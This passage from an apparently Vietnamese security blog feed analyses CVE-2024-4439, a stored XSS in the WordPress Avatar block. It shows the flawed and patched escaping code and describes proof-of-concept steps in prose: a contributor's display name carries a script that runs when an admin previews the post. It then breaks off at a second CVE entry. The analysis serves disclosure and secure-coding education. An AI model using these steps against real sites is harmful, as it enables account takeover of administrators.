href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Trong phi√™n b·∫£n &lt;strong&gt;vulnerable&lt;/strong&gt;, WP Core ƒë√£ s·ª≠ d·ª•ng &lt;a href=&#34;https://developer.wordpress.org/reference/functions/esc_attr__/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;esc_attr__()&lt;/code&gt;&lt;/a&gt; ƒë·ªÉ d·ªãch chu·ªói v√† escape HTML attribute tr∆∞·ªõc khi hi·ªÉn th·ªã ra browser, nh∆∞ng ƒë√£ tri·ªÖn khai sai c√°ch.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$label = &amp;#39;aria-label=&amp;#34;&amp;#39; . sprintf( esc_attr__( &amp;#39;(%s author archive, opens in a new tab)&amp;#39; ), $author_name ) . &amp;#39;&amp;#34;&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;esc_attr__()&lt;/code&gt; sau khi d·ªãch chu·ªói v√† escape HTML th√¨ m·ªõi ƒë∆∞a v√†o &lt;code&gt;sprintf()&lt;/code&gt; ƒë·ªÉ ch√®n bi·∫øn &lt;code&gt;$author_name&lt;/code&gt; =&amp;gt; &lt;code&gt;$author_name&lt;/code&gt; kh√¥ng ƒë∆∞·ª£c x·ª≠ l√Ω.&lt;/p&gt;&#xA;&lt;p&gt;Trong phi√™n b·∫£n &lt;strong&gt;patched&lt;/strong&gt;, &lt;code&gt;$author_name&lt;/code&gt; ƒë∆∞·ª£c ƒë∆∞a v√†o &lt;code&gt;sprintf()&lt;/code&gt; tr∆∞·ªõc v√† sau ƒë√≥ m·ªõi ƒë∆∞·ª£c escape HTML b·∫±ng &lt;code&gt;esc_attr()&lt;/code&gt; =&amp;gt; an to√†n tr∆∞·ªõc XSS.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$label = &amp;#39;aria-label=&amp;#34;&amp;#39; . esc_attr( sprintf( __( &amp;#39;(%s author archive, opens in a new tab)&amp;#39; ), $author_name ) ) . &amp;#39;&amp;#34;&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-09-cve-2024-4439/dif1.png&#34;&#xA;    alt=&#34;So s√°nh s·ª± thay ƒë·ªïi gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;So s√°nh s·ª± thay ƒë·ªïi gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;function render_block_core_avatar( $attributes, $content, $block ) {&#xA;  // other logic&#xA;  if ( ! isset( $block-&amp;gt;context[&amp;#39;commentId&amp;#39;] ) ) {&#xA;    $author_id   = isset( $attributes[&amp;#39;userId&amp;#39;] ) ? $attributes[&amp;#39;userId&amp;#39;] : get_post_field( &amp;#39;post_author&amp;#39;, $block-&amp;gt;context[&amp;#39;postId&amp;#39;] );&#xA;    $author_name = get_the_author_meta( &amp;#39;display_name&amp;#39;, $author_id );&#xA;    // other logic&#xA;    if ( isset( $attributes[&amp;#39;isLink&amp;#39;] ) &amp;amp;&amp;amp; $attributes[&amp;#39;isLink&amp;#39;] ) {&#xA;      $label = &amp;#39;&amp;#39;;&#xA;      if ( &amp;#39;_blank&amp;#39; === $attributes[&amp;#39;linkTarget&amp;#39;] ) {&#xA;        // translators: %s is the Author name.&#xA;        $label = &amp;#39;aria-label=&amp;#34;&amp;#39; . sprintf( esc_attr__( &amp;#39;(%s author archive, opens in a new tab)&amp;#39; ), $author_name ) . &amp;#39;&amp;#34;&amp;#39;;&#xA;      }&#xA;    }&#xA;  }&#xA;  // other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Avatar block&lt;/strong&gt; l√† 1 block c·ªßa &lt;strong&gt;Block Editor&lt;/strong&gt; d√πng ƒë·ªÉ t·∫°o n·ªôi dung cho post ho·∫∑c comment trong WordPress.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$author_name&lt;/code&gt; l√† &lt;code&gt;display_name&lt;/code&gt; c·ªßa author c√≥ &lt;code&gt;$author_id&lt;/code&gt; thu·ªôc v·ªÅ post hi·ªán t·∫°i.&lt;/p&gt;&#xA;&lt;p&gt;N·∫øu ƒë√¢y l√† post v√† c√≥ link th√¨ &lt;code&gt;$author_name&lt;/code&gt; ch·ª©a payload s·∫Ω th√™m v√†o attribute &lt;code&gt;aria-label&lt;/code&gt; v√† hi·ªÉn th·ªã ra tr√¨nh duy·ªát.&lt;/p&gt;&#xA;&lt;p&gt;Khi truy c·∫≠p m·ªôt post b·∫•t k·ª≥, &lt;code&gt;wp()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi l√† l·∫•y d·ªØ li·ªáu c·ªßa post ƒë√≥.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-09-cve-2024-4439/debug1.png&#34;&#xA;    alt=&#34;N∆°i b·∫Øt ƒë·∫ßu l·∫•y d·ªØ li·ªáu t·ª´ post hi·ªán t·∫°i&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;N∆°i b·∫Øt ƒë·∫ßu l·∫•y d·ªØ li·ªáu t·ª´ post hi·ªán t·∫°i&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;pre&gt;&lt;code&gt;function wp( $query_vars = &amp;#39;&amp;#39; ) {&#xA;&#x9;global $wp, $wp_query, $wp_the_query;&#xA;&#xA;&#x9;$wp-&amp;gt;main( $query_vars );&#xA;&#xA;&#x9;if ( ! isset( $wp_the_query ) ) {&#xA;&#x9;&#x9;$wp_the_query = $wp_query;&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;T·∫°i ƒë√¢y &lt;code&gt;$wp_query&lt;/code&gt; m·ªõi ƒë∆∞·ª£c t·∫°o v√† n√≥ s·∫Ω ch·ª©a gi√° tr·ªã c·ªßa &lt;code&gt;wp_post&lt;/code&gt; sau khi query.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function main( $query_args = &amp;#39;&amp;#39; ) {&#xA;  $this-&amp;gt;init();&#xA;&#xA;  $parsed = $this-&amp;gt;parse_request( $query_args );&#xA;&#xA;  if ( $parsed ) {&#xA;    $this-&amp;gt;query_posts();&#xA;    $this-&amp;gt;handle_404();&#xA;    $this-&amp;gt;register_globals();&#xA;  }&#xA;&#xA;  $this-&amp;gt;send_headers();&#xA;&#xA;  do_action_ref_array( &amp;#39;wp&amp;#39;, array( &amp;amp;$this ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;main()&lt;/code&gt; s·∫Ω &lt;code&gt;parse_request&lt;/code&gt; v√† th·ª±c hi·ªán query l·∫•y th√¥ng tin post hi·ªán t·∫°i b·∫±ng &lt;code&gt;query_posts()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-09-cve-2024-4439/debug2.png&#34;&#xA;    alt=&#34;L·∫•y th√¥ng tin post b·∫±ng query_post()&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;L·∫•y th√¥ng tin post b·∫±ng query_post()&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;code&gt;$wp_the_query&lt;/code&gt; l√† ƒë·ªëi t∆∞·ª£ng &lt;strong&gt;WP_Query ch√≠nh&lt;/strong&gt; c·ªßa WordPress, c√≤n &lt;code&gt;$wp_query&lt;/code&gt; ch·ªâ ƒë∆°n gi·∫£n l√† m·ªôt &lt;strong&gt;tham chi·∫øu&lt;/strong&gt; (reference) tr·ªè ƒë·∫øn &lt;code&gt;$wp_the_query&lt;/code&gt;. V√¨ v·∫≠y, khi &lt;code&gt;$wp_the_query&lt;/code&gt; ƒë√£ ƒë∆∞·ª£c kh·ªüi t·∫°o v√† c√≥ d·ªØ li·ªáu, th√¨ &lt;code&gt;$wp_query&lt;/code&gt; c≈©ng s·∫Ω c√≥ c√πng gi√° tr·ªã.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-09-cve-2024-4439/debug3.png&#34;&#xA;    alt=&#34;Gi√° tr·ªã tham chi·∫øu c·ªßa $wp_query&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Gi√° tr·ªã tham chi·∫øu c·ªßa $wp_query&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Ta c√≥ ƒë∆∞·ª£c gi√° tr·ªã post_content:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;!-- wp:avatar {&amp;#34;userId&amp;#34;:2,&amp;#34;isLink&amp;#34;:true,&amp;#34;linkTarget&amp;#34;:&amp;#34;_blank&amp;#34;} /--&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp:avatar&lt;/code&gt; thu·ªôc lo·∫°i block &lt;code&gt;core/avatar&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;H√†m &lt;code&gt;render()&lt;/code&gt; s·∫Ω g·ªçi ƒë·∫øn &lt;code&gt;call_user_func()&lt;/code&gt; v·ªõi callback l√† &lt;code&gt;render_block_core_avatar()&lt;/code&gt; ƒë·ªÉ l·∫•y HTML c·ªßa Avatar block r·ªìi tr·∫£ v·ªÅ cho ng∆∞·ªùi d√πng.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;sources--sinks&#34;&gt;&lt;span&gt;Sources &amp;amp; Sinks&lt;/span&gt;&#xA;  &lt;a href=&#34;#sources--sinks&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Source&lt;/strong&gt;: author name c·ªßa contributor+&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Sink&lt;/strong&gt;: &lt;code&gt;$author_name&lt;/code&gt; ƒë∆∞·ª£c ch√®n v√†o attribute &lt;code&gt;aria-label&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;T·∫°o post account v·ªõi role &lt;code&gt;contributor+&lt;/code&gt; c√≥ ch·ª©a avatar block, b·∫≠t t√≠nh nƒÉng &lt;strong&gt;Link to user profile&lt;/strong&gt; v√† ch·ªçn user contributor.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-09-cve-2024-4439/post1.png&#34;&#xA;    alt=&#34;T·∫°o post v·ªõi link to user profile ƒë∆∞·ª£c b·∫≠t&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;T·∫°o post v·ªõi link to user profile ƒë∆∞·ª£c b·∫≠t&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Thay ƒë·ªïi firstname ch·ª©a XSS payload v√† ch·ªçn display name l√† firstname&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-09-cve-2024-4439/disname.png&#34;&#xA;    alt=&#34;Ch·ªçn display name ch·ª©a XSS payload&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Ch·ªçn display name ch·ª©a XSS payload&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Admin preview post =&amp;gt; XSS x·∫£y ra&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-09-cve-2024-4439/xss1.png&#34;&#xA;    alt=&#34;XSS x·∫£y ra khi admin truy preview post&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;XSS x·∫£y ra khi admin truy preview post&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2024-4439&lt;/strong&gt; trong &lt;strong&gt;WordPress Core &amp;lt;= 6.5.1&lt;/strong&gt; b·∫Øt ngu·ªìn t·ª´ vi·ªác s·ª≠ d·ª•ng sai h√†m &lt;code&gt;esc_attr__()&lt;/code&gt; khi x·ª≠ l√Ω &lt;code&gt;display_name&lt;/code&gt; trong &lt;strong&gt;Avatar block&lt;/strong&gt;, d·∫´n ƒë·∫øn &lt;strong&gt;Stored XSS&lt;/strong&gt;. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y b·∫±ng c√°ch ch√®n payload v√†o &lt;code&gt;display_name&lt;/code&gt;, khi·∫øn script ƒë·ªôc h·∫°i th·ª±c thi khi ng∆∞·ªùi d√πng (bao g·ªìm admin) truy c·∫≠p trang ch·ª©a block. B·∫£n v√° trong &lt;strong&gt;6.0.8, 6.1.6, 6.2.5, 6.3.4, 6.4.4, 6.5.2&lt;/strong&gt; ƒë√£ thay ƒë·ªïi c√°ch x·ª≠ l√Ω ‚Äî escape sau khi format chu·ªói b·∫±ng &lt;code&gt;sprintf()&lt;/code&gt; ‚Äî ƒë·∫£m b·∫£o d·ªØ li·ªáu an to√†n tr∆∞·ªõc khi render ra browser.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Th·ª© t·ª± escape r·∫•t quan tr·ªçng&lt;/strong&gt;: d·ªØ li·ªáu c·∫ßn ƒë∆∞·ª£c &lt;strong&gt;format tr∆∞·ªõc&lt;/strong&gt;, r·ªìi m·ªõi &lt;strong&gt;escape&lt;/strong&gt; ƒë·ªÉ tr√°nh l·ªçt XSS.&lt;/li&gt;&#xA;&lt;li&gt;Ngay c·∫£ &lt;strong&gt;core functions&lt;/strong&gt; nh∆∞ &lt;code&gt;esc_attr__()&lt;/code&gt; n·∫øu d√πng sai c√°ch c≈©ng c√≥ th·ªÉ m·ªü ra l·ªó h·ªïng nghi√™m tr·ªçng.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Stored XSS&lt;/strong&gt; ƒë·∫∑c bi·ªát nguy hi·ªÉm v√¨ n√≥ t·ªìn t·∫°i b·ªÅn trong database v√† ƒë∆∞·ª£c k√≠ch ho·∫°t b·∫•t k·ª≥ khi n√†o ng∆∞·ªùi d√πng truy c·∫≠p.&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng ch·ªâ plugin/theme, m√† &lt;strong&gt;WordPress Core&lt;/strong&gt; c≈©ng c·∫ßn ƒë∆∞·ª£c &lt;strong&gt;update th∆∞·ªùng xuy√™n&lt;/strong&gt; ƒë·ªÉ gi·∫£m thi·ªÉu r·ªßi ro b·∫£o m·∫≠t.&lt;/li&gt;&#xA;&lt;li&gt;Vi·ªác ph√¢n t√≠ch &lt;strong&gt;patch diff&lt;/strong&gt; l√† c√°ch hi·ªáu qu·∫£ ƒë·ªÉ h·ªçc c√°ch l·∫≠p tr√¨nh an to√†n v√† hi·ªÉu r√µ ngu·ªìn g·ªëc c·ªßa l·ªói.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet ‚Äî PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/patchstack_database_here&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Core &amp;lt;= effected_version_here ‚Äî CVE-2024-4439&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-9816 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-08-cve-2025-9816/</link>
      <pubDate>Wed, 08 Oct 2025 13:57:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-08-cve-2025-9816/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;WP Statistics ‚Äì The 